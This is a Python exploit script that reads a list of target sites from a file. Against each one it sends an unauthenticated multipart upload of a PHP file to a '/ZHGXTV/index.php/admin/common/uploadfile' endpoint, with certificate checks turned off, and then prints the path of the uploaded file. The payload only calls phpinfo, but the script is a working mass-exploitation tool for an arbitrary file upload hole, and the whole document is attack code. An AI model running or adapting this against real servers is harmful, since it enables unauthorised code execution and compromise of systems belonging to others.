import requests
import ssl
import re
from bs4 import BeautifulSoup


headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'User-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55',
    'Content-type' : 'multipart/form-data; boundary=----WebKitFormBoundaryxcexPspczP3BiouN'
}

Data = "\n\n\n------WebKitFormBoundaryxcexPspczP3BiouN\nContent-Disposition: form-data; name=\"file\"; filename=\"wen.php\"\nContent-Type: application/octet-stream\n\n<?php phpinfo(); ?>\n------WebKitFormBoundaryxcexPspczP3BiouN--\n"
def get_url(target_text):
    with open(target_text, 'r') as f:   #读取文件，循环取值
        for target_url in f:
            url = target_url.strip('\n') #删除末尾换行符，此处更适合用str.replace(“\n”,””)：替换”\n”为空 
            vuln_url = url + "/ZHGXTV/index.php/admin/common/uploadfile"
            try:    #异常处理
                ssl._create_default_https_context = ssl._create_unverified_context  #ssl证书问题忽略
                reponse_get = requests.post(url=vuln_url,headers=headers,data=Data,timeout=10) #获取请求包回应信息
                if reponse_get.status_code == 200 :
                    soup = BeautifulSoup(reponse_get.text,"html.parser")    #读取回应的网页内容
                    #title=soup.title.string.replace('\r','').replace('\n','')   #提取标题信息
                    re_text=re.findall('filePath":".(.+.\.php)',str(soup))[0]
                    print("地址{}\n请求成功，响应：{}".format(url,soup))
                    print("\033[32m[❤️]文件路径为：{}/ZHGXTV/{}\033[0m".format(url,re_text))

                else:
                    print("请求失败")
                    sys.exit(0)
            except Exception as e:
                print("\033[31m[☠️] 程序异常:{} \033[0m".format(e))
                continue
                

    

if __name__ == '__main__':
    target_text = str(input('请拖入检测列表:'))
    get_url(target_text)